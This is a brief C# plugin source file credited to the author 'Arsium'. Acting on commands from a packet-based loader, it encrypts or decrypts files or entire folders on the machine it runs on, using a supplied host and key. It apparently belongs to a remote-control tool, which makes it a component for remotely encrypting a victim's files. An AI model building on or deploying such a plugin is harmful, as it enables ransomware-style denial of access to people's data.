using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch 
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            CryptographyPacket cryptographyPacket = (CryptographyPacket)loadingAPI.currentPacket;
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.CRP_ENCRYPTION:
                    if (cryptographyPacket.isPathAFolder)
                        new Helpers.FolderOperator(cryptographyPacket, loadingAPI.host, loadingAPI.key, true);
                    else
                        new Helpers.FileOperator(cryptographyPacket, loadingAPI.host, loadingAPI.key, true);
                    break;

                case PacketType.CRP_DECRYPTION:
                    if (cryptographyPacket.isPathAFolder)
                        new Helpers.FolderOperator(cryptographyPacket, loadingAPI.host, loadingAPI.key, false);
                    else
                        new Helpers.FileOperator(cryptographyPacket, loadingAPI.host, loadingAPI.key, false);
                    break;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
